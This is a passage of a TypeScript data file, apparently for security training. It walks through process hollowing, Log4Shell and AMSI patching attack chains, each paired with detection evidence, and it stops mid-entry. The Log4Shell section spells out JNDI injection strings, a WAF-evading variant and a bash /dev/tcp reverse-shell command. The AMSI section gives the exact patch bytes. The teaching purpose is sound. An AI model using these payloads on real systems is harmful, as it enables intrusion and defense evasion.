import type { RawScenarioStepGuideData } from '../scenario-step-guides';

export const CORE_AND_PALOALTO_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'process-hollowing': {
    scenarioId: 'process-hollowing',
    briefing: {
      headline: 'Scenario Briefing: Process Hollowing (MITRE T1055.012), Running Malware Inside a Trusted Windows Process',
      storyAnalogy:
        'Imagine an intruder who wants to enter a high-security bank without raising an alarm. Instead of breaking down the front door in a ski mask, they hire an official armored bank truck, freeze it inside the garage before the driver even starts the route, and pocket two golden master keys: the first master key unlocks the rear cargo doors so they can empty all the legal bank gold and load their own covert crew inside, and the second master key unlocks the driver cab so they can reprogram the GPS route and release the brake. When the truck rolls out, every security camera and guard at the gate still sees the bank’s own trusted license plate and uniform.',
      plainSummary:
        'In this scenario (MITRE ATT&CK T1055.012, the catalog entry for Process Hollowing), the attacker wants to run malicious code on Victim Laptop WKS-04 (10.10.4.15) without triggering antivirus or application-allowlisting rules. Instead of launching an unknown .exe file directly, the stage-1 dropper (Invoice_Q4.exe, PID 3104, the initial malicious loader on disk) calls CreateProcessW (Windows’ standard API for starting a new program) to spawn a genuine Windows system process, C:\\Windows\\System32\\svchost.exe (PID 4892, chosen because it carries a valid Microsoft digital signature that host firewalls and analysts trust), in a paused state using CREATE_SUSPENDED = 0x00000004 (a flag that freezes its primary thread TID 4896 before any code runs so the loader can safely modify its memory). In return, Windows hands back two master control handles (numeric permission tokens): Process Master Key hProcess = 0x01C4 (used to inspect, empty, and rewrite svchost.exe’s memory in Steps #2 and #3) and Thread Master Key hThread = 0x01C8 (used to redirect the paused CPU thread and wake it up in Step #4). Using hProcess = 0x01C4, the loader reads the child’s PEB (Process Environment Block, Windows’ internal process data table, at offset PEB+0x10 to locate ImageBaseAddress = 0x00400000) and calls NtUnmapViewOfSection (a native syscall that strips the legitimate Microsoft code out of RAM, returning STATUS_SUCCESS = 0x00000000). Next, it calls VirtualAllocEx (to reserve 264 KB of private RWX memory at the freed 0x00400000 address that can be both written and executed) and WriteProcessMemory (to copy 270,336 bytes of the unpacked Cobalt Strike Beacon PE image directly into RAM using full access mask GrantedAccess = 0x1FFFFF). Using hThread = 0x01C8, the loader calls SetThreadContext (to overwrite the paused thread’s RCX starting-address register to 0x004014A0) and ResumeThread (to drop SuspendCount from 1 to 0 so the thread wakes up running the Beacon). Finally, the hollowed svchost.exe opens an encrypted TLS 1.3 HTTPS C2 session (blending in as normal web traffic) to 185.220.101.42:443 (sending GET /jquery-3.3.1.min.js and receiving HTTP 200 OK encrypted commands on a 60s / 20% random jitter sleep schedule).',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (Victim Laptop WKS-04 10.10.4.15) and Node ④ (Invoice_Q4.exe PID 3104 → svchost.exe PID 4892), follow the 4 in-memory hollowing steps (#1 to #4) monitored by Node ⑥ (SOC SIEM & Sysmon EDR Sensor), and watch Step #5 send the outbound HTTPS C2 beacon to Node ① (Attacker Phishing & C2 Server 185.220.101.42:443).',
      documentedAdvisory: 'MITRE ATT&CK T1055.012 · Sysmon v15 EventID 1 / 3 / 10 / 25 · Elastic Detection Rules',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1106',
        plainTitle: 'Launching a Legitimate Windows Process in a Paused ("Suspended") State',
        storyAnalogy:
          'Instead of kicking down the bank’s front door in a ski mask, the intruder walks up to the dispatch desk and hires an official armored bank truck. The split-second the truck rolls into the private garage bay, before the driver even turns the ignition, the intruder slams a freeze switch that locks the entire truck in ice-blue stillness and pockets two golden master keys: the first master key unlocks the rear cargo bay so the intruder can empty the bank gold and load their covert crew, and the second master key unlocks the driver cab and ignition so they can later change the GPS route and release the brake.',
        simpleExplanation:
          'Acting as the intruder at the dispatch desk, the initial loader (Invoice_Q4.exe, PID 3104, the stage-1 file executed on Victim Laptop WKS-04, 10.10.4.15) calls CreateProcessW (Windows’ standard user-mode API for launching a new program) to hire our "official armored bank truck", a real Windows system binary: C:\\Windows\\System32\\svchost.exe (PID 4892, chosen because svchost.exe carries a valid Microsoft digital signature, so security tools and analysts naturally expect to see it running in the background). Hitting the "garage freeze switch" means passing the creation flag CREATE_SUSPENDED = 0x00000004 (which instructs the Windows kernel to assemble the process container in RAM and create its main worker thread TID 4896, but pause it at the starting line before its first line of code can execute). In response, the Windows kernel hands back a populated PROCESS_INFORMATION structure (Windows’ startup receipt) containing the "two golden master keys": Process Master Key hProcess = 0x01C4 (a numeric permission handle that unlocks svchost.exe’s virtual memory so Invoice_Q4.exe can inspect, erase, and inject code into it during Steps #2 and #3) and Thread Master Key hThread = 0x01C8 (a separate permission handle that unlocks the paused thread’s CPU controls so Invoice_Q4.exe can redirect its starting address and wake it up in Step #4).',
        howItWorksInPractice:
          'When CreateProcessW (Windows’ user-mode function for starting a program) is invoked with CREATE_SUSPENDED (0x00000004, a creation flag that pauses the new program before its first instruction runs so the attacker gets a quiet window to swap its contents), it calls ntdll!NtCreateUserProcess (the low-level system call inside ntdll.dll that crosses into the Windows kernel to build a new process). Inside the kernel, Windows allocates an EPROCESS object for PID 4892 (the kernel’s master tracking record storing the process’s trusted svchost.exe identity, security token, and memory map), maps ntdll.dll (Windows’ mandatory core bridge library required by every process to make kernel requests) and the signed svchost.exe binary at base address 0x00400000 (the standard starting memory slot where Windows loads executable code so internal memory jumps line up cleanly), and parks the primary thread TID 4896 (the main execution worker assigned to run the program’s CPU instructions) at ntdll!RtlUserThreadStart (Windows’ built-in thread launchpad where every new thread waits right before jumping into the program’s own startup code) with SuspendCount = 1 (a kernel pause counter set to 1 so the CPU scheduler skips this thread and keeps the child process completely inert in RAM until resumed). At the same time, Windows grants the parent dropper PROCESS_ALL_ACCESS = 0x1FFFFF (the highest possible Windows permission mask allowing full memory reading, unmapping, writing, and thread manipulation) through two returned master key handles: hProcess = 0x01C4 (the Process Master Key used to modify svchost.exe’s RAM in Steps #2 and #3) and hThread = 0x01C8 (the Thread Master Key used to redirect CPU registers and unfreeze TID 4896 in Step #4).',
        diagramAlignment:
          'On the diagram, look at Step #1 between Node ③ (Victim Laptop WKS-04) and Node ④ (Invoice_Q4.exe PID 3104 → svchost.exe PID 4892) returning the suspended process and thread handles (PID 4892, hProcess = 0x01C4 for memory edits, hThread = 0x01C8 for thread control).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 1 (ProcessCreate, the Windows telemetry log recording every newly launched program and its parent): non-service parent C:\\Users\\Public\\Downloads\\Invoice_Q4.exe (PID 3104) spawning C:\\Windows\\System32\\svchost.exe (PID 4892, an immediate red flag because legitimate svchost.exe instances are always spawned by services.exe with a -k service group flag).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1055.012',
        plainTitle: 'Hollowing Out ("Unmapping") the Original svchost.exe Code From Memory',
        storyAnalogy:
          'Using the first golden master key (the cargo-door key from Step #1) while the official armored bank truck stays frozen inside the garage, an overhead X-ray gantry scans the truck’s cargo manifest to pinpoint where every gold bar is stored. The heavy rear blast doors swing wide open and every crate of genuine bank bullion slides out onto the unloading ramp and vanishes, leaving a completely hollow truck inside while its official bank paint and license plate stay untouched outside.',
        simpleExplanation:
          'Now that the "frozen armored bank truck", svchost.exe (PID 4892, still halted in memory so it cannot run or trigger normal runtime checks), is parked inside the bay, Invoice_Q4.exe (PID 3104) uses its first golden master key, Process Master Key hProcess = 0x01C4 (the memory-access permission handle obtained in Step #1 specifically for reading and editing the child’s RAM), to scan the truck’s "cargo manifest": the child’s Process Environment Block (PEB, Windows’ internal summary table storing a process’s loaded modules and memory layout, read at offset PEB+0x10 so the loader learns the exact starting address where svchost.exe was mapped: ImageBaseAddress = 0x00400000). Emptying out every "crate of genuine bank bullion" happens when the loader calls ntdll!NtUnmapViewOfSection(hProcess = 0x01C4, BaseAddr = 0x00400000) (a low-level native Windows syscall that detaches and removes the original Microsoft svchost.exe code from RAM without terminating the process), and the kernel replies with NTSTATUS = 0x00000000 (STATUS_SUCCESS, the kernel confirmation code proving that memory slot 0x00400000 inside PID 4892 is now completely hollow and ready for the covert crew).',
        howItWorksInPractice:
          'When NtUnmapViewOfSection (the user-mode native API wrapper in ntdll.dll used to detach a mapped memory section) transitions into kernel routine nt!MiUnmapViewOfSection (the internal Windows kernel function that tears down mapped views of an executable file), the Windows Virtual Memory Manager (the OS subsystem that tracks which memory pages belong to each process) removes the file-backed SEC_IMAGE mapping (a special kernel memory region tied directly to a signed executable file on disk) from the process’s Virtual Address Descriptor (VAD, the kernel’s internal tree inventory recording every allocated address range and its read/write/execute permissions) for C:\\Windows\\System32\\svchost.exe at 0x00400000 and returns STATUS_SUCCESS = 0x00000000 (freeing the exact 0x00400000 base address so the replacement malware image can be loaded there in Step #3 without needing complex internal pointer relocations, while PID 4892 still retains its Microsoft-signed process name and token in the kernel process table).',
        diagramAlignment:
          'On the diagram, follow Step #2 between Node ④ (Invoice_Q4.exe → svchost.exe) and Node ③ (Victim Laptop WKS-04) executing NtUnmapViewOfSection @ 0x00400000 and returning NTSTATUS 0x00000000 (STATUS_SUCCESS).',
        detectionAndEvidence:
          'Documented in Win32 API / Kernel Memory ETW (Event Tracing for Windows, Microsoft’s built-in kernel telemetry feed capturing MiUnmapViewOfSection) & Sysmon EventID 10 / 25: NtUnmapViewOfSection(hProcess=0x01C4, BaseAddr=0x00400000) -> STATUS_SUCCESS (flagging an outside process stripping the primary executable image section out of a suspended system binary).',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055.012',
        plainTitle: 'Allocating Writable-Executable (RWX) Memory & Injecting the Malicious PE Image',
        storyAnalogy:
          'Keeping the rear cargo bay open with that same cargo-door master key, the intruder unlocks a hidden high-clearance compartment inside the empty armored bank truck with all security barriers disabled, then quietly marches their covert crew and mission crate straight up the rear ramp into the hollow bay. The blast doors swing shut around the trusted exterior paint and license plate so nobody outside notices the swap.',
        simpleExplanation:
          'Carving out that "unlocked secret cargo bay" at the exact vacated slot (0x00400000, reusing the original base address freed in Step #2 so internal code pointers inside the malware do not break), Invoice_Q4.exe (PID 3104) again uses Process Master Key hProcess = 0x01C4 (holding GrantedAccess = 0x1FFFFF, the full permission mask allowing cross-process memory allocation and writing) to call VirtualAllocEx (Windows’ cross-process memory reservation API) and reserve 264 KB (270,336 bytes) of private memory with PAGE_EXECUTE_READWRITE = 0x40 permissions (known as RWX, allowing the loader to write payload bytes into that memory right now and letting the CPU immediately execute those same bytes as code a moment later). Marching the "covert crew and mission crate" up the rear ramp is WriteProcessMemory (Windows’ API for copying bytes from one process into another process’s RAM) streaming the unpacked Cobalt Strike Beacon PE headers ("MZ" / 4D 5A, the two-byte magic signature identifying every Windows executable) and its core program sections (.text for executable instructions, .rdata for read-only constants and import tables, and .data for writable variables) directly into svchost.exe’s RAM, returning lpNumberOfBytesWritten = 270,336 (confirming the entire covert payload and its startup entry point at 0x004014A0 are sealed inside the trusted truck without ever writing a malware file to the hard drive).',
        howItWorksInPractice:
          'Across the kernel syscall pair NtAllocateVirtualMemory (the low-level kernel routine that reserves and commits new virtual memory pages inside a target process) and NtWriteVirtualMemory (the kernel routine that copies raw bytes across process boundaries), Windows creates an unbacked private memory region marked MEM_PRIVATE (anonymous RAM not tied to any signed file on disk) with PAGE_EXECUTE_READWRITE = 0x40 permissions at 0x00400000 (which immediately stands out forensically because a legitimate program loaded from disk uses file-backed SEC_IMAGE pages that strictly separate Read-Execute code in .text = 0x20 from Read-Write data in .data = 0x04 so code cannot be rewritten on the fly). Committing 270,336 bytes containing an "MZ" PE header (4D 5A, the unmistakable fingerprint of a full Windows executable) into unbacked RWX memory inside svchost.exe (PID 4892) is one of the strongest forensic indicators of process hollowing.',
        diagramAlignment:
          'On the diagram, Step #3 shows Node ③ and Node ④ allocating 264 KB of RWX memory at 0x00400000 inside svchost.exe (PID 4892) with GrantedAccess = 0x1FFFFF and writing 270,336 bytes.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 10 (ProcessAccess, which logs whenever one process opens a high-privilege handle with GrantedAccess = 0x1FFFFF into another process like svchost.exe PID 4892) and Kernel ETW Threat-Intelligence (EtwTiLogAllocVMRemote, a dedicated Microsoft kernel sensor alerting on cross-process 264 KB RWX = 0x40 memory allocations containing an unbacked MZ header).',
      },
      {
        stepNumber: 4,
        mitreId: 'T1055.012',
        plainTitle: 'Hijacking the CPU Thread Context & Resuming Execution',
        storyAnalogy:
          'With the covert crew sealed in the back, the intruder now pulls out the second golden master key (the cab-and-ignition key from Step #1) to unlock the frozen truck’s front cab before releasing the brake. They turn the steering wheel hard, erase the bank’s official route from the dashboard GPS, dial in their own secret destination, and finally shatter the freeze lock, releasing the handbrake so the official bank truck roars out of the garage onto the intruder’s route.',
        simpleExplanation:
          'Even though the "covert crew" (Cobalt Strike Beacon) is now sealed inside svchost.exe (PID 4892 at 0x00400000), the frozen driver thread (TID 4896, controlled via the second golden master key, Thread Master Key hThread = 0x01C8 obtained in Step #1 specifically for steering and waking the paused thread) is still aimed at the old Microsoft startup route. Reprogramming the "dashboard GPS and steering wheel" means Invoice_Q4.exe (PID 3104) calls SetThreadContext(hThread = 0x01C8) (Windows’ API for rewriting a paused thread’s saved CPU registers) to overwrite the thread’s RCX register (on 64-bit Windows, a brand-new suspended thread holds its upcoming program startup address inside CPU register RCX, so changing RCX aims the thread straight at the injected Beacon without calling noisier APIs like CreateRemoteThread) with 0x004014A0 (calculated as Base 0x00400000 plus EntryPoint RVA 0x14A0, the byte offset to the Beacon’s first executable instruction). Finally, "shattering the freeze lock and releasing the brake" is ResumeThread(hThread = 0x01C8) (Windows’ API that lowers a thread’s pause counter from 1 down to 0, returning PreviousSuspendCount = 1 to confirm the thread was previously paused and launching TID 4896 so the hijacked truck immediately runs the Beacon).',
        howItWorksInPractice:
          'When NtSetContextThread (the kernel syscall that modifies a suspended thread’s saved CPU register state) and NtResumeThread (the kernel syscall that decrements a thread’s pause counter so the CPU scheduler can dispatch it) complete in the kernel, Windows updates the thread’s saved trap frame at KTRAP_FRAME.Rcx = 0x004014A0 (the kernel memory snapshot holding the CPU register values that will be loaded onto the processor the instant this thread wakes up) and releases TID 4896 from ntdll!RtlUserThreadStart (Windows’ thread startup launchpad, which immediately jumps execution to whatever address sits in RCX) into active user-mode execution. Because TID 4896 is now running independently inside svchost.exe (PID 4892), the original stage-1 loader Invoice_Q4.exe (PID 3104) can safely exit while the Beacon survives inside the trusted system process, although waking the tampered thread simultaneously fires kernel image-tampering callbacks (alerting Sysmon EventID 25 because the live executable pages at 0x00400000 no longer match the signed svchost.exe file on disk).',
        diagramAlignment:
          'On the diagram, Step #4 runs from Node ④ (Invoice_Q4.exe → svchost.exe PID 4892) to Node ⑥ (SOC SIEM & Sysmon EDR Sensor), waking TID 4896 at RCX = 0x004014A0 and logging Sysmon Event ID 25 (ProcessTampering: "Image is replaced").',
        detectionAndEvidence:
          'Documented in Sysmon EventID 25 (ProcessTampering with Type "Image is replaced", a kernel detection fired specifically when a resumed thread inside C:\\Windows\\System32\\svchost.exe PID 4892 executes memory at 0x00400000 that no longer matches its signed on-disk binary).',
      },
      {
        stepNumber: 5,
        mitreId: 'T1071.001',
        plainTitle: 'Outbound HTTPS Command-and-Control (C2) Beacon From the Hollowed Process',
        storyAnalogy:
          'Now rolling down the boulevard, the disguised armored bank truck pulls up to the high-security checkpoint gate. The security cameras read the bank’s official license plate, the uniformed guard smiles and lifts the barrier, and the truck opens a hidden encrypted courier line straight to the intruder’s remote warehouse, until a watchful control-room radar notices the truck drove out on an unscheduled route without a dispatch slip.',
        simpleExplanation:
          'Rolling past the "checkpoint guard" in the bank’s own trusted uniform means the Beacon is executing inside C:\\Windows\\System32\\svchost.exe (PID 4892, so path-based endpoint firewall rules see a trusted Windows binary requesting network access and automatically allow the connection). Opening the "hidden encrypted courier line to the secret warehouse" is Cobalt Strike loading winhttp.dll (Windows’ built-in HTTP client library, used so the implant relies on legitimate OS networking code), establishing a TLS 1.3 HTTPS connection (modern transport encryption that hides commands from basic packet inspection) over TCP port 443 (the standard HTTPS web port chosen to blend in with normal employee browsing) to the external Command-and-Control server at 185.220.101.42:443, and sending an HTTP GET request for /jquery-3.3.1.min.js (a Malleable C2 disguise profile that hides RSA-encrypted victim host metadata inside the HTTP Cookie header to mimic a harmless web script download). The remote warehouse (185.220.101.42:443) replies with HTTP 200 OK (disguised as an application/javascript file carrying AES-encrypted operator tasking and a 60-second callback interval with 20% random jitter, intentionally varying check-in timing to evade simple fixed-timer beacon detectors).',
        howItWorksInPractice:
          'Application-based host firewalls often permit C:\\Windows\\System32\\svchost.exe (trusted by file path as a core Windows service host binary) to initiate outbound HTTPS connections through the perimeter NAT (Network Address Translation gateway forwarding corporate workstation traffic to the internet). However, a genuine svchost.exe is always spawned by services.exe (Windows’ official Service Control Manager) and always carries a "-k <ServiceGroup>" command-line flag (which tells Windows which bundle of system services that host process should run), so a bare svchost.exe (PID 4892) spawned by Invoice_Q4.exe (PID 3104) negotiating TLS 1.3 with JA3 fingerprint 72a589da586844d7f0818ce684948eea (a hash of the client’s TLS handshake parameters that fingerprints Cobalt Strike’s network stack even when payloads are encrypted) and polling /jquery-3.3.1.min.js every 60s (±20% jitter) is immediately caught by SIEM correlation.',
        diagramAlignment:
          'On the diagram, Step #5 travels from Node ④ (Hollowed svchost.exe PID 4892) to Node ① (Attacker Phishing & C2 Server 185.220.101.42:443), while Node ⑥ (SOC SIEM & Sysmon EDR Sensor) correlates the host and network alerts.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 3 (NetworkConnect, logging outbound TCP connections per process and capturing bare svchost.exe PID 4892 dialing 185.220.101.42:443) correlated with Suricata IDS (network intrusion sensor alerting on the Cobalt Strike Malleable C2 /jquery-3.3.1.min.js URI and TLS JA3 fingerprint 72a589da586844d7f0818ce684948eea).',
      },
    ],
  },

  'log4shell-dfir': {
    scenarioId: 'log4shell-dfir',
    briefing: {
      headline: 'Scenario Briefing: Log4Shell (CVE-2021-44228), From a Single HTTP Log Line to Remote Code Execution',
      storyAnalogy:
        'Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building.',
      plainSummary:
        'In this scenario (CISA Advisory AA21-356A / CVE-2021-44228), an attacker (91.214.124.88) compromises a Spring Boot Java server (app-prod-01, 10.20.1.15:8080 behind Nginx Reverse Proxy 10.20.1.10:443) simply by sending a specially crafted text string, ${jndi:ldap://91.214.124.88:1389/Basic/Command/Base64/...} (a dynamic lookup token that Log4j2 evaluates as an executable directory query rather than plain text), inside an HTTP header (X-Api-Version / User-Agent). When the Java application (PID 1420, running as service user tomcat) logs that header using vulnerable Apache Log4j2 (v2.14.1), Log4j’s message lookup feature reaches out to the attacker’s rogue Marshalsec LDAP server (91.214.124.88:1389), follows a referral to download a compiled Java class (Exploit.class from http://91.214.124.88:8888/Exploit.class), and spawns a child shell (/bin/sh PID 8912) that dials an interactive reverse shell back to 91.214.124.88:4444.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Attacker Exploit & Scanner 91.214.124.88), follow Step #1 (#1→) through Node ② (Nginx Reverse Proxy 10.20.1.10:443), trace Step #2 (#2→) as Node ③ (Spring Boot App Server app-prod-01 10.20.1.15) queries Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:1389), watch Step #3 (#3→) fetch Exploit.class into Node ④ (java PID 1420 → /bin/sh PID 8912), and follow Step #4 (#4→) spawning the reverse shell to Node ① (91.214.124.88:4444) monitored by Node ⑥ (SOC SIEM & Linux Auditd).',
      documentedAdvisory: 'CISA Alert AA21-356A · NIST NVD CVE-2021-44228 · MITRE ATT&CK T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Sending the "${jndi:ldap://...}" String Inside an HTTP Header & Triggering Logger Evaluation',
        storyAnalogy:
          'The intruder walks up to the front reception desk and hands over a visitor badge whose "X-Api-Version / User-Agent" field contains a secret phone-call instruction instead of a normal browser name.',
        simpleExplanation:
          'The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression, ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} (using nested ${lower:...} tokens to evade basic WAF string filters while still resolving to a JNDI lookup), inside the HTTP User-Agent and X-Api-Version headers (chosen because web servers automatically write these headers into their access and failed-login audit logs). Nginx logs the request and returns HTTP 401 Unauthorized after forwarding it to the Spring Boot backend (10.20.1.15, PID 1420), which immediately passes the unauthenticated request’s User-Agent string into logger.info() (triggering the vulnerability even though the login attempt itself returned 401).',
        howItWorksInPractice:
          'Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info("Failed login from UA: " + userAgent) (recording client metadata for security audit trails). Because Log4j2 v2.0 to 2.14.1 had message pattern lookups enabled by default (designed to resolve variables like ${java:version} inside log lines), logging the rejected HTTP 401 request causes JndiLookup.lookup() inside java (PID 1420) to parse and execute the embedded "${jndi:ldap://...}" expression.',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ① (Attacker Exploit & Scanner 91.214.124.88) to Node ② (Nginx Reverse Proxy 10.20.1.10:443), forwarding GET /api/v1/login into the Java application and returning HTTP 401.',
        detectionAndEvidence:
          'Documented in CISA AA21-356A & Nginx Access Log (/var/log/nginx/access.log) / ModSecurity CRS Rule 944150: GET /api/v1/login returning HTTP 401 with User-Agent containing "${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}".',
      },
      {
        stepNumber: 2,
        mitreId: 'T1203',
        plainTitle: 'Log4j Evaluates the Lookup & Connects Out to the Attacker’s Rogue LDAP Server',
        storyAnalogy:
          'As the receptionist writes the visitor’s header into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (91.214.124.88:1389) to ask what to do next.',
        simpleExplanation:
          'Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI, Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI opens an outbound TCP connection from 10.20.1.15:49210 to port 1389 on the attacker’s rogue Marshalsec LDAP server at 91.214.124.88:1389 and sends a 118-byte LDAP SearchRequest for baseObject "Exploit" (forcing the internal web server to reach out across the firewall and ask the attacker’s directory server how to construct the logged object).',
        howItWorksInPractice:
          'JNDI supports pluggable directory protocols including LDAP, RMI, and DNS. Because Log4j2 v2.14.1 placed no domain whitelist on JndiManager.lookup(), an attacker-supplied ldap://91.214.124.88:1389/Exploit URL forces javax.naming.InitialContext.lookup() inside PID 1420 to transmit the outbound LDAP SearchRequest (118 B) and accept the rogue server’s LDAP SearchResultEntry response containing external class-loading attributes. In the documented Suricata / Zeek exchange from DMZ WAF & Reverse Proxy to Java App Server (app-prod-01), Java App Server (app-prod-01) responds with ALERT 118 B (confirming that the LDAP QUERY request succeeded on Java App Server (app-prod-01) and establishing the runtime state required for Step #3 LDAP REFERRAL & REMOTE CLASS LOADING).',
        diagramAlignment:
          'On the diagram, follow Step #2 / Link #2 (#2→ / ⇠#2) from Node ③ (Spring Boot App Server app-prod-01 10.20.1.15) out to Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:1389), returning the LDAP SearchResultEntry referral.',
        detectionAndEvidence:
          'Documented in Suricata IDS (ET EXPLOIT Apache Log4j RCE Outbound LDAP) & Zeek: internal Java server 10.20.1.15:49210 initiating unexpected outbound TCP/1389 LDAP SearchRequest (118 B) to 91.214.124.88:1389.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1105',
        plainTitle: 'LDAP Referral & Downloading Remote "Exploit.class" Bytecode Over HTTP',
        storyAnalogy:
          'The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (javaCodeBase)." The Java server obediently fetches that blueprint and loads it directly into memory.',
        simpleExplanation:
          'The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server that the requested object class is hosted at an external HTTP URL). Obeying those attributes, the JVM (PID 1420 on 10.20.1.15) sends an HTTP GET /Exploit.class request to 91.214.124.88:8888 and receives an HTTP 200 OK response delivering 1.8 KB (1,842 bytes) of compiled Java bytecode (application/java-vm with magic header 0xCAFEBABE, which URLClassLoader.findClass("Exploit") maps directly into JVM memory).',
        howItWorksInPractice:
          'When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to http://91.214.124.88:8888/Exploit.class (allowing the attacker to stream a 1.8 KB compiled Java class over standard HTTP and instantiate it inside PID 1420).',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) delivers GET /Exploit.class (HTTP 200 OK · 1.8 KB Java Bytecode) from Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:8888) into Node ④ (java PID 1420 → /bin/sh PID 8912).',
        detectionAndEvidence:
          'Documented in Zeek http.log & Suricata: Java process (10.20.1.15) receiving HTTP 200 OK (1,842 bytes, application/java-vm, CAFEBABE magic header) from http://91.214.124.88:8888/Exploit.class.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1059.004',
        plainTitle: 'Executing the Static Initializer & Spawning a "/bin/sh" Reverse Shell',
        storyAnalogy:
          'The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (static {} block) snaps open and dials a permanent private backdoor phone line (/bin/sh) straight back to the intruder on port 4444.',
        simpleExplanation:
          'The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user).',
        howItWorksInPractice:
          'By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line).',
        diagramAlignment:
          'On the diagram, Step #4 / Link #4 (#4→ / ⇠#4) spawns /bin/sh (PID 8912) inside Node ④ (java PID 1420 → /bin/sh) and connects out to Node ① (91.214.124.88:4444), while Node ⑥ (SOC SIEM & Linux Auditd) logs SYSCALL execve (PID 8912).',
        detectionAndEvidence:
          'Documented in Linux Auditd (SYSCALL 59 execve, pid=8912, ppid=1420, uid=1001 tomcat) & Sigma rule: /usr/bin/java spawning /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1".',
      },
    ],
  },

  'amsi-reflective-dll': {
    scenarioId: 'amsi-reflective-dll',
    briefing: {
      headline: 'Scenario Briefing: In-Memory AMSI Patching & Reflective DLL Injection (MITRE T1562.001 / T1620)',
      storyAnalogy:
        'Imagine a burglar inside a jewelry store where every bag is inspected by an X-ray scanner at the counter (AMSI). Before pulling any tools out of their coat, the burglar reaches into the X-ray machine’s display wire inside their own room and solders a tiny jumper so the screen permanently flashes "BAG IS CLEAN". With the scanner blinded, they assemble their custom lockpick right in their hands without ever setting a tool down on the floor (the hard drive).',
      plainSummary:
        'Normally, when PowerShell runs a script or loads a .NET assembly, Windows Antimalware Scan Interface (AMSI, the built-in bridge that hands script buffers to the endpoint antivirus before execution) inspects the unencrypted code in memory. In this scenario (MITRE T1562.001 & T1620), the attacker on DEV-WKS-09 (10.10.4.55) first blinds AMSI inside their own PowerShell process (powershell.exe, PID 6120 under CORP\\admin_clark) by calling VirtualProtect to make amsi.dll!AmsiScanBuffer (at 0x7FF91A042480) writable and overwriting its prologue with a 6-byte x64 patch (B8 57 00 07 80 C3 -> mov eax, 0x80070057; ret so every scan returns E_INVALIDARG / clean). With AMSI silenced inside PID 6120, PowerShell reflectively loads a 512 KB compiled C# agent DLL directly from a byte array in RAM ([System.Reflection.Assembly]::Load at 0x024A80000, avoiding any file write to the C: drive).',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (DEV-WKS-09 10.10.4.55) and Node ④ (powershell.exe PID 6120), follow Step #1 (#1→) unlocking amsi.dll!AmsiScanBuffer (0x7FF91A042480), Step #2 (#2→) writing the 6-byte patch and triggering Node ⑥ (Defender ATP / Kernel ETW Sensor), and Step #3 (#3→) reflectively loading the unbacked 512 KB CLR assembly at 0x024A80000.',
      documentedAdvisory: 'MITRE ATT&CK T1562.001 & T1620 · Microsoft Defender EtwTiLogProtectVM · PowerShell EventID 4104 · DotNETRuntime ETW',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1562.001',
        plainTitle: 'Locating amsi.dll in PowerShell’s Memory & Making AmsiScanBuffer Writable',
        storyAnalogy:
          'The intruder locates the exact inspection box (amsi.dll) mounted inside their room and unlocks its metal protective cover (changing memory protection from Read-Execute to Read-Write-Execute) so the internal wiring can be altered.',
        simpleExplanation:
